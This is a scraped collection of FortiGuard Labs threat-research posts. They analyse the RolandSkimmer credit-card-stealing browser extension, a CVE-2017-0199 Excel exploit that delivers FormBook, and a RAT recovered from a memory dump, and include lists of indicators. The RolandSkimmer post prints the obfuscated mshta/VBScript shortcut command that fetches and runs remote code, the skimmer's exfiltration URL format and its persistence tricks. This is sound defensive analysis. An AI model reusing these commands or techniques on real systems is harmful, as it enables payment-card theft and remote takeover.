154[.]91[.]85[.]204154[.]86[.]22[.]47156[.]251[.]17[.]17206[.]238[.]179[.]173206[.]238[.]220[.]60206[.]238[.]199[.]22154[.]91[.]85[.]201206[.]238[.]221[.]182206[.]238[.]196[.]32154[.]91[.]64[.]45206[.]238[.]115[.]207156[.]251[.]17[.]12107[.]149[.]253[.]183 00-1321729461[.]cos[.]ap-guangzhou[.]myqcloud[.]com6-1321729461[.]cos[.]ap-guangzhou[.]myqcloud[.]comtwzfte-1340224852[.]cos[.]ap-guangzhou[.]myqcloud[.]comcq1tw[.]toptwcz[.]protwczb[.]comtwnc[.]inktwnic[.]icutwnic[.]inktwnic[.]ltdtwnic[.]xintwsa[.]toptwsw[.]cctwsw[.]clubtwsw[.]infotwsw[.]inktwsw[.]ltdtwsw[.]protwsww[.]viptwsww[.]xintwswz[.]toptwswzz[.]xintwtgtw[.]nettwzfw[.]vip 6558dfb070421c674b377a0a6090593fa0c44d5b0dec5325a648583f92175ce2d3a270d782e62574983b28bd35076b569a0b65236e7f841a63b0558f2e3a231ca8430ce490d5c5fab1521f3297e2d277ee7e7c49e7357c208878f7fd5f7639317d3f352ded285118e916336da6e6182778a54dc88d4fb7353136f028ac9b81e0143f434e3a2cac478fb672b77d6c04cdf25287d234a52ee157f4f1a2b06f8022c25e80cd10e7741b5f3e0b246822e0af5237026d5227842f6cf4907daa0398487263550339c2a35f356bb874fb3a619b76f2d602064beada75049e7c2927a6dc a8b6c06daeede6199e69f4cafd79299219def5bf913a31829dede98a8ad2aaa96fcd6aef0678d3c6d5f8c2cb660356b25f68c73e7ee24fbb721216a547d17ffaed72721837c991621639b4e86ffe0c2693ef1a545741b5513d204a1e3e008d8c65edd9e1a38fd3da79c8a556eb2c7c595125ffec9f7483e2e6e189a08cc5d4120a0375648bc9368bccfd3d657d26976d5b1f975381d1858d001404d807334058e809582faccdd27337aa46b4a11dd11f5d0c7d7428ebdc8c895ea80777e4da5f59d2433264d8ec9e9797918be3aa7132dbeb71e141f6e5c64c0d6f1cb4452934 ac957ba4796f06c4bf0c0afb8674bbeb30eb95cef85bc68ced3ee1aa30e3acff9296adb71bc98140a59b19f68476d45dbb38cc60b9e263d07d14e7178f195989636c2ccffce7d4591b0d5708469070b839f221400b38189c734004641929ae0531ffa4e3638c9e094275051629cc3ac0a8c7d6ae8415bbfcacc4c605c7f0df39da3deea591b59b1a0f7e11db2f729a263439a05f3e8b0de97bbac99154297cea e2269b38655a4d75078362856c16594e195cd647c56b8c55883b8e1286baa65852632d9e24f42c4651cf8db3abc37845e693818d64ab0b11c235eddf8e011b2f7200155f3e30dbbd4c4c26ce2c7bd4878ab992b619d80b43c0bd9e17390082fce516b102a2a6001eafb055e42feb9000691e2353c7e87e34ddaa99d7d8af16fda9ddd4e4d54336ce110fdc769ff7c4940f8d89b45ee8dc24f56fc3ea00c18873a12d17cca038cdbf79b72356e5d20b17722c7b20bd2ee308601bac901890f3f4b1ac2178c90c8eafd8121d21acbae7a0eb0cbc156d4a5f692f44b28856a23481a6c1629b4450f713b02d24f088c4f26b0416c6a7924dcf0477425f3a67a2e3ff3ce81c163ddedb132116cdf92aae197ced0b94f3fc3d1036f5c41b084a256a03a19fdfc131e8fbe063289c83a3cdefb9fb9fb6f1f92c83b892d3519a381623dbdb15f45f69f863510986fb2198a8a6b3d55d8ccc8a2ed4bb30bc27bdd1bf151cbf1a7938f61a9905e1b151c7a5f925a2ce3870b7c3e80f6e0fc07715bdc258b7f42c6949c6d8ecf648bacca08cde568f11ec2663221a97dae5fbf01218e8775a FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/threat-group-targets-companies-in-taiwan"
  },
  {
    "title": "RolandSkimmer: Silent Credit Card Thief Uncovered",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Collects victim’s sensitive informationSeverity Level:High Web-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection. The attacker first spreads a malicious ZIP file named “faktura_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura_1065170.lnk.” This shortcut covertly executes the following hidden command: C:\\WiNDOws\\SYsTEM32\\MShTA.exe vbscript:execute(\"SeT mi1=CReATeobjECt(\\\"msxmL2.SErverXMlHTtp.6.0\\\"):mi1.OpEN \\\"geT\\\",\\\"Hxxp://iNVsetmX[.]cOM/ipa.AsPX\\\",faLSe:mi1.SEnD():rANdOMize:R=INt(rnD*99999):ExECute(REpLAce(mI1.REsponSEtEXt,\\\"#\\\", R)):\")(wiNDoW.ClosE) The page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands. Below is a network traffic example showing both the regular communication and the encoded commands received from the server. The encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts. First, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path. It then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments. To target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.” The following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities. The attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites. The extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions: This combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception. The background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code. To generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions. The script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—<imaage> instead of a valid <img> or <image> tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js. The background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.The retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.” The malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5). After detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden <a> elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft. Once the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number): hxxps://bg3dsec[.]com/<randomized str>?S=<useridentifier>-<site>&D=<captured form data>?&N=<credit card number> Attackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS). The critical component of this attack lies in the maliciously crafted LNK file with the following arguments: --load-extension=”%LOCALAPPDATA%\\s2ch97” ----mark-non-secure-as=disabled. The LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment. The attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.” These decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation. By leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled. Once all the browsers’ related settings are complete, mshta.exe is killed. Upon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented. These logs included status messages such as: These logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly. “RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information. The attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity. The malware described in this report are detected and blocked byFortiGuard Antivirusas: LNK/Agent.96F1!trJS/Agent.SOM!trVBS/Agent.ABUE!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. invsetmx[.]comfzhivka-001-site1[.]btempurl[.]comexmkleo[.]combg3dsec[.]comzzigi20-001-site1.atempurl.comtopclima-001-site1.itempurl.comrinootracebg-001-site1.etempurl.commgproperties-001-site1.itempurl.comkleoti-001-site1.htempurl.com 80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d 86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f17086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0 4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2cd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53c02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb45810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered"
  },
  {
    "title": "How a Malicious Excel File (CVE-2017-0199) Delivers the FormBook Payload",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Control and Collect Sensitive Information from a Victim’s DeviceSeverity level:Critical FortiGuard Labs recently observed a high-severity phishing campaign targeting old version Office Application users through malicious email attachments. The emails deliver an Excel file designed to exploit theCVE-2017-0199vulnerability, a known flaw in old version Microsoft Office's OLE (Object Linking and Embedding) functionality. The malware being spread in this campaign is FormBook, an information-stealing malware known for its ability to capture sensitive data, including login credentials, keystrokes, and clipboard information. Upon opening the malicious Excel file, the malware performs a series of operations, ultimately running the FormBook payload. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The phishing campaign starts with an email disguised as a sales order urging the recipient to open an attached Excel document. As shown in Figure 1, FortiMail has flagged the email as “[virus detected]” in the Subject line to warn the recipient. CVE-2017-0199 is a logic vulnerability found in older versions of the Office Application (Office 2007/2010 /2013 /2016). When a user opens the attached Office document targeting this vulnerability, the program sends an HTTP request to a remote server to retrieve a malicious HTA file. The program then uses COM objects to find the application/HTA file handler, which causes the Microsoft HTA application (mshta.exe) to load and execute the malicious script. Figure 2 shows how CVE-2017-0199 works: We opened the Office document from the email attachment using a compression program, which allowed us to directly view the OLE object content, as shown in Figure 3. If we had opened the Office document within a vulnerable version of Office, it would have triggered CVE-2017-0199, causing the download and execution of the linked content. As you can see, this is a very long URL. However, when accessing it normally, we don't need to pay attention to the content between the protocol and the '@' symbol. This allows us to obtain the actual URL we need. (hxxps[:]//agr[.]my/P6bJNr) Figure 4 shows the discovery of the shortened URL. When this link is accessed, it triggers a 302 redirect that jumps to the actual destination address. If you would like to learn this vulnerability in greater depth, this article provides a more thorough analysis:An Inside Look at CVE-2017-0199 – HTA and Scriptlet File Handler Vulnerability CVE-2017-0199 is a vulnerability dating back eight years, for which official patches have already been released. Nevertheless, due to the inherent challenges of vulnerability management and remediation—encompassing outdated software systems, overburdened IT teams, organizational negligence, or technical incompetence—organizations that fail to promptly update their systems, apply patches inconsistently, or implement security measures carelessly remain susceptible to exploitation of this vulnerability. We can see that the downloaded script is an HTA file (Figure 5), with its main execution logic being a segment of base64-encoded content. After decoding the base64 content, we found that its core functionality is to download a new file, place it in the %APPDATA% directory, and then execute it. (Figure 6) By analyzing sections of the obtained sample, we observed that its .rsrc section contains an unformatted resource data entry named “SCRIPT,” as shown in Figure 7. Examining its content revealed that it begins with the byte sequence “A3 48 4B BE 98 6C 4A A9 99 4C 53 0A 86 D6 48 7D”, which is characteristic of executable files generated by Aut2Exe from AutoIt scripts. Using a debugger for dynamic analysis, we attempted to examine how the sample decrypts the content of the SCRIPT resource and executes the payload, as shown in Figure 8. After initially reading and verifying the \"SCRIPT\" resource, the sample uses the IsDebuggerPresent API for anti-debugging measures, as shown in Figure 9. If it detects that the program is being debugged, it will only output, \"This is a third-party compiled AutoIt script.\" Afterwards, the sample reads the \"SCRIPT\" resource again and decrypts its contents, as shown in Figure 10. After thorough analysis, we discovered that the script decodes the encoded content using 0x1Em and extracts a file called “springmaker” from itself to the %TEMP% directory. It then calls CallWindowProc to run the decoded content, as shown in Figure 11. By examining the content of the “springmaker” file and decompiling what CallWindowProc executes, we discovered that the “springmaker” file is XORed with the string “3NQXSHDTVT2DPK06”, as shown in Figure 12. By applying the same XOR operation using that same string, we can restore the original file. At this point, we have finally obtained the core payload, which is the FormBook malware, as shown in Figure 13. If you would like to learn more about FormBook, here is a recent analysis:Infostealer Malware FormBook Spread via Phishing Campaign – Part II This is a serious phishing campaign targeting Windows users. The attackers send emails with malicious Excel attachments that exploit the CVE-2017-0199 vulnerability to deploy the FormBook malware. The attack process involves distributing malicious Excel files through phishing emails and exploiting CVE-2017-0199 to download and execute malicious HTA files. The HTA file downloads and executes \"sihost.exe,\" which in turn extracts \"springmaker.\" Finally, the \"springmaker\" file is decoded into the FormBook malware. The entire process is shown in Figure 14. This attack aims to take control of victims' devices and steal sensitive information, posing a significant threat. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiMailrecognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox, embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions, provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS servicedetects the vulnerability exploit against CVE-2017-0199 with the signature “MS.Office.OLE.autolink.Code.Execution”. FortiGuard Antivirus service detects the malicious Excel document, the HTA file, the malicious sihost.exe file as well as the decrypted FormBook with the following AV signatures. MSExcel/CVE_2017_0199.G1!exploitVBS/Obfuscated.AO!trAutoIt/Injector.GKX!trW32/Formbook.AA!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the free NSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp[:]//172[.]245[.]123[.]32/xampp/hh/wef[.]htahxxp[:]//172[.]245[.]123[.]32/199/sihost[.]exe [AprilSAO2025.xls]33A1696D69874AD86501F739A0186F0E4C0301B5A45D73DA903F91539C0DB427 [wef.hta]2BFBF6792CA46219259424EFBBBEE09DDBE6AE8FD9426C50AA0326A530AC5B14 [siHOST.exe]7E16ED31277C31C0370B391A1FC73F77D7F0CD13CC3BAB0EAA9E2F303B6019AF [springmaker]A619B1057BCCB69C4D00366F62EBD6E969935CCA65FA40FDBFE1B95E36BA605D [FormBook / Decrypted springmaker]3843F96588773E2E463A4DA492C875B3241A4842D0C087A19C948E2BE0898364 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/how-a-malicious-excel-file-cve-2017-0199-delivers-the-formbook-payload"
  },
  {
    "title": "Deep Dive into a Dumped Malware without a PE Header",
    "content": "FortiGuard Labs Threat Research This analysis is part of an incident investigation led by the FortiGuard Incident Response Team. We discovered malware that had been running on a compromised machine for several weeks. The threat actor had executed a batch of scripts and PowerShell to run the malware in a Windows process. Although obtaining the original malware executable was difficult, a memory dump of the running malware process and a full memory dump of the compromised machine (the “fullout” file, size 33GB) were successfully acquired. Figure 1 provides detailed file information about the dumped memory file, “fullout,” which we scanned to build a local test environment for analyzing the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The malware was running within a dllhost.exe process with PID 8200. The dumped file is named pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp. The file name reveals that the malware was loaded and deployed in memory at address range 0x1c3eefb0000 to 0x1c3ef029fff. The dumped file is a deployed 64-bit PE (Portable Executable) file. During execution, the Windows Loader reads and parses its DOS and PE headers to load and deploy the PE file. Once deployed, these headers are no longer needed. To evade dumping the malware into a file for analysis by researchers, some malware often corrupts these header regions by overwriting them with zeros (like this one) or random data. As shown in Figure 2, both the DOS and PE headers are corrupted, making it difficult to reconstruct the entire executable from memory. To dynamically analyze the malware, we needed to replicate the compromised system’s environment locally. This required launching the dllhost.exe process in a debugger to serve as a target process for deploying the dumped malware. This would allow us to analyze the malware within a local analysis environment. Preparing the malware to execute properly in this controlled setting involves several complicated steps. The first step is to locate the entry point function (the start function), which is the initial code executed when the malware is loaded into memory by the Windows Loader. While the offset of the entry point function is typically stored in the PE header, this was not the case. Instead, we had to manually locate the entry point (the start function). Based on our experience, the first instruction of the entry function is typically compiled as “sub rsp, 28h,” but other functions may also contain this instruction. However, by dumping the malware in IDA Pro, we were able to search for all occurrences of this instruction in the IDA Pro database. Fortunately, only eight instances of the instruction appeared in the malware (Figure 3). After analysis, we confirmed that the fourth function (at 0x1C3EEFEE0A8) is the entry point. In a newly launched dllhost.exe process, we manually executed some instructions to allocate memory for deploying the dumped malware, as seen in Figure 4. It calls a relevant VirtualAlloc() API with the same base address—0x1C3EEB70000—as seen in the compromised system. Once allocated, the dumped malware was copied into the newly created memory. A PE file’s Import table lists the Windows APIs it depends on. These API loading addresses differ on different Windows systems. To run and analyze the dumped malware in the local system, these addresses needed to be relocated to the ones loaded in the local system. Figure 5 shows part of the Windows API addresses from the Import Table. Based on our analysis, the final API address can be calculated from this information. For instance, the API address at 0x1C3EF0240D0 is 0x1C3EEEE1CE0, as shown in Figure 5. It calculates the API address as 0x7FFD74224630 by executing the following ASM code at address 0x1C3EEEE1CE0h: 001C3EEEE1CE0movr10, 0E528F49552F112B4h 001C3EEEE1CEAmovr11, 0E5288B6826D35484h 001C3EEEE1CF4xorr11, r10 001C3EEEE1CF7jmpr11; 0x7FFD74224630 Using the Volatility tool, we listed the loaded modules in the dllhost.exe process (PID 8200) from the “fullout” file. As you can see in Figure 6, the API at 0x7FFD74224630 is exported from module GDI32.dll. By dumping the GDI32.dll from the “fullout” file and analyzing it, we determined that the API at address 0x7FFD74224630 corresponds to GetObjectW() in the compromised system. In our local test environment, this same API resides at address 0x07FFFF77CB870. For this API,  its original address was replaced with the local address. This malware has 257 Windows APIs requiring relocation across 16 modules, including: kernel32.dll ws2_32.dll ntdll.dll gdi32.dll shlwapi.dll sspicli.dll user32.dll shell32.dll msvcrt.dll advapi32.dll, comctl32.dll crypt32.dll gdiplus.dll ole32.dll rpcrt4.dll userenv.dll For each API in the Import Table, its original address must be replaced with its corresponding local address using the same method used for API GetObjectW(). In addition, we needed to load all the required modules that were not automatically loaded by dllhost.exe. To do this, the API LoadLibraryA() or LoadLibraryW() with the module name must be called to load them into the malware’s memory. Figure 7 shows the malware running in a debugger. The RIP register points to the entry point's address at 0x1C3EEFEE0A8. The debugger also shows some of the relocated Windows API functions at the bottom. Based on our analysis, the malware also required some global variable data located at address 0x1C3EEB7000 with a size of 0x5A000 bytes. We extracted the required global data from the “fullout” file using the Volatility tool and the dd command. We again called the VirtualAlloc() API to allocate a new memory region within the dllhost.exe process at the desired address and size. After successful allocation, the extracted data was copied into the newly allocated memory space, as shown in Figure 8. Static analysis of the malware’s entry point function reveals that the function requires three parameters. The first parameter (RCX) is the base address of the loaded malware, which in this case is 0x1C3EEFB0000. The value of the second parameter (RDX) is 0x1. The third parameter (R8) is a pointer to a 0x30-byte buffer, which can also be extracted from the “fullout” file. We prepared all three parameters accordingly and allocated additional memory to store the 30H data for the third parameter, as illustrated in Figure 9. The last critical item is the correct alignment of the RSP register. When breaking at the entry point, the lowest four bits of the RSP value must be 0x8, as shown in Figure 9. Failing to align the RSP properly can trigger an exception of EXCEPTION_ACCESS_VIOLATION (code 0xC0000005) when the malware starts. This is due to a misalignment error, particularly when executing instructions like “movdqa,” which requires 16-byte alignment. In 64-bit code mode, before calling the entry point function, the RSP’s value is 16-byte aligned (the lowest four bits are 0x0). It pushes the return address onto the stack, and the RSP value is minus eight. To correct this, we adjusted the value from 0x09CAD11D850 to 0x09CAD11D848. After multiple trials, errors, and repeated fixes, we finally managed to run the malware in the local environment. Upon execution, the malware calls a function to decrypt its C2 server domain information stored in memory. As shown in Figure 10, the decryption function is displayed along with the newly decrypted domain details, including the domain (\"rushpapers.com\") and port number (\"443\"). The malware then establishes communication with its C2 server by creating a thread. As shown in Figure 11, it prepares to invoke the CreateThread() API with the thread function at 0x1C3EEFDE300. The newly created thread is responsible for handling communication with its C2 server. Part of the thread’s code is shown on the right side of Figure 11. After launching the thread, the main thread enters a sleep state until the communication thread completes its execution. As the decrypted domain port “443” indicates, the malware communicates with the C2 server over the TLS protocol. It uses the getaddrinfo() API to obtain the domain “rushpapers.com” IP address via a DNS query. Figure 12 is a Wireshark capture of the network traffic generated by the malware as it communicates with its C2 server. Since the TLS packet is encrypted, we need to inspect the data before encryption or after decryption to view the plaintext content. This can be done by setting breakpoints in a debugger on both encryption and decryption routines used by this malware. The malware leverages two API functions, SealMessage() and DecryptMessage(), to encrypt and decrypt the data for the TLS traffic. As you can see in Figure 13, the malware is preparing to encrypt an HTTP GET request using the SealMessage() API. Below are two examples of plaintext packets--one sent and one received--: Request packet (before TLS encryption): GET /ws/ HTTP/1.1 Host: rushpapers[.]com Connection: Upgrade Upgrade: websocket Sec-WebSocket-Version: 13 Sec-WebSocket-Key: OCnq155rYct3ykkkdLrjvQ== Response packet (after TLS decryption): HTTP/1.1 101 Switching Protocols Server: nginx/1.18.0 Date: Fri, 28 Mar 2025 06:13:24 GMT Connection: upgrade Upgrade: websocket Sec-WebSocket-Accept: Bzr0K1o6RJ4bYvvm4AM5AAG172Y= These two plaintext packets are used to complete a handshake-like process. Afterward, it switchesto a custom encryption algorithm to encrypt the packet data before applying TLS encryption. Below is an example of the data that has been encrypted using the custom algorithm. 0000000082 A6 16 98 5C 75 59 CB66 55 41 F1 32 11 79 EF‚¦ ˜\\uYËfUAñ2 yï 000000102F 55 27 A8 7C 5A 36 AE68 58 74 F1 28 55 3E A9/U'¨|Z6®hXtñ(U>© 000000206C 5B 26 B6 6D 4C 26 AC69 5C 1B 92l[&¶mL&¬i\\ ’ A clearer breakdown of the data is in the table below: Offset Length Description 00 01 Magic tag.0x82 01 Variable Variable-extended-length. 0xA6 for this case. 02 04 Encryption key. 16 98 5C 75 06 26H Encrypted data. 59 CB66 … 1B 92 According to the variable-extended-length rule, the data size is calculated as 0xA6-0x80=0x26. The encryption key (such as 0x755C9816) is a randomly generated number. The custom encryption’s algorithm performs a repeated XOR operation between each byte of the key and the encrypted data bytes. As a result, the decrypted data is as follows: 000000004F 53 3A 20 57 69 6E 646F 77 73 20 31 30 20 2FOS: Windows 10 / 0000001020 36 34 2D 62 69 74 2028 31 30 2E 30 2E 31 3964-bit (10.0.19 0000002030 34 35 29 0D 0A045) The decrypted data clearly reveals the system information from our local test environment: \"OS: Windows 10 / 64-bit (10.0.19045)\\r\\n”. This information is collected and sent to the C2 server when requested by the C2 server. Below is a code snippet demonstrating the custom algorithm used to encrypt and decrypt the data. […] 001C3EF00CED3 loc_1C3EF00CED3:; CODE XREF: sub_1C3EF00CE08+FD↓j 001C3EF00CED3moveax, r9d 001C3EF00CED6andeax, 80000003h 001C3EF00CEDBjgeshort loc_1C3EF00CEE4 001C3EF00CEDDdeceax 001C3EF00CEDForeax, 0FFFFFFFCh 001C3EF00CEE2inceax 001C3EF00CEE4 001C3EF00CEE4 loc_1C3EF00CEE4:; CODE XREF: sub_1C3EF00CE08+D3↑j 001C3EF00CEE4movecx, [rbx+30h] 001C3EF00CEE7addecx, r9d 001C3EF00CEEAcdqe 001C3EF00CEECincr9d 001C3EF00CEEFmovr8b, byte ptr [rsp+rax+28h+arg_0];; the random key 001C3EF00CEF4xorr8b, [r10];;;;;;; encrypt/decrypt the data with random key. 001C3EF00CEF7incr10 001C3EF00CEFAmovrax, [rbx+20h] 001C3EF00CEFEmov[rcx+rax], r8b 001C3EF00CF02cmpr9d, edi; edi is data size 001C3EF00CF05jlshort loc_1C3EF00CED3 001C3EF00CF07 001C3EF00CF07 loc_1C3EF00CF07:; CODE XREF: sub_1C3EF00CE08+C6↑j 001C3EF00CF07add[rbx+30h], edi 001C3EF00CF0Ajmploc_1C3EF00CE55 […] Through a comprehensive analysis of its API calls and execution flow, we have confirmed this malware to be aRAT(Remote Access Trojan). This section details the malware’s capabilities for controlling the compromised system. The malware has a feature that captures the victim’s screen as JPEG images and exfiltrates them to its C2 server. It also collects the title of the current active (topmost) program to provide context about what the user is doing at the time of capture. To do this, it calls a sequence of APIs, including CreateStreamOnHGlobal(), GdiplusStartup(), GetSystemMetrics(), CreateCompatibleDC(), CreateCompatibleBitmap(), BitBlt(), GdipCreateBitmapFromHBITMAP(), GdipSaveImageToStream(), and GdipDisposeImage(). Figure 14 shows how the malware captures the screenshot by calling these APIs. The malware includes a thread function designed to act as a server, listening on a TCP port specified by the C2 server. Once activated, this function allows the malware to await incoming connections from the attacker. It implements a multi-threaded socket architecture: each time a new client (attacker) connects, the malware spawns a new thread to handle the communication. This design enables concurrent sessions and supports more complex interactions. By operating in this mode, the malware effectively turns the compromised system into a remote-access platform, allowing the attacker to launch further attacks or perform various actions on behalf of the victim. The malware can enumerate and manipulate the system services on the infected machine. It achieves this by leveraging several Windows Service Control Manager (SCM) APIs, including OpenSCManagerW(), EnumServicesStatusExW(), ControlService(), and more. This analysis successfully demonstrated the deployment and dynamic analysis of malware with corrupted DOS and PE headers in a controlled local environment. The detailed process—from preparing the malware for execution, including memory allocation and API resolution, to correcting execution parameters—ensured accurate emulation of the malware’s behavior. Our investigation into the payload revealed its sophisticated communication with the C2 server, including secure encryption and decryption mechanisms using the SealMessage() and DecryptMessage() APIs. Finally, we confirmed the malware’s significant capabilities on the compromised system, such as screen capture, remote server functionality, and manipulation of system services via Service Control Manager APIs. Fortinet protects against these attacks, and theFortiGuard IR teamis available to assist you whenever needed. Fortinet customers are already protected from this malware with FortiGuard’s AntiVirus, Web Filtering, and 